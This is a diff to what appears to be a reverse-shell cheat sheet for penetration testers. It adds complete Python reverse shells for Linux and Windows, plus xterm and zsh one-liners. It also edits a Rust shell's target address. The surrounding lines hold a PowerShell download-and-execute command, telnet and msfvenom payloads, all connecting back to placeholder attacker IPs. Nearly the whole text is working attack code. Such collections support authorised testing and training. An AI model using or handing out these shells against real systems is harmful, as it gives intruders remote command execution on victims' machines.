@@ -23,6 +23,8 @@ If you come across any other methods please feel free to contribute to this part
 * [NodeJS](#nodejs)
 * [Telnet](#telnet)
 * [War](#war)
+* [xtern](#xterm)
+* [zsh](#zsh)
 * [Spawn TTY Shell](#spawn-tty-shell)
 * [Stabalize Your Shells](#stabalize-your-shells)
 
@@ -270,6 +272,50 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubuse
 
 ### Python
 
+**Python for Linux**
+```
+#!/usr/bin/env python
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.0.x.x",666))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+```
+**Python for Windows**
+```
+import os, socket, subprocess, threading, sys
+
+def s2p(s, p):
+    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+
+def p2s(s, p):
+    while True: s.send(p.stdout.read(1).encode())
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+while True:
+    try: s.connect((10.0.x.x, 666)); break
+    except: pass
+
+p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+
+threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+
+threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+
+try: p.wait()
+except: s.close(); sys.exit(0)
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
+```
+
 **IPv4**
 ```
 export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -313,7 +359,7 @@ use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
 fn main() {
-    let s = TcpStream::connect("10.0.0.1:4242").unwrap();
+    let s = TcpStream::connect("10.0.x.x:1337").unwrap();
     let fd = s.as_raw_fd();
     Command::new("/bin/sh")
         .arg("-i")
@@ -352,6 +398,24 @@ telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
+```
+
+### xterm
+```
+xterm -display 10.0.0.1:1
+```
+To catch the reverse shell on your attacking machine:
+```
+Xnest :1
+```
+You may need to autorize the victim machine
+```
+xhost +targetip
+```
+
+### zsh
+```
+zsh -c 'zmodload zsh/net/tcp && ztcp && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
 ```
 
 ### Spawn TTY Shell
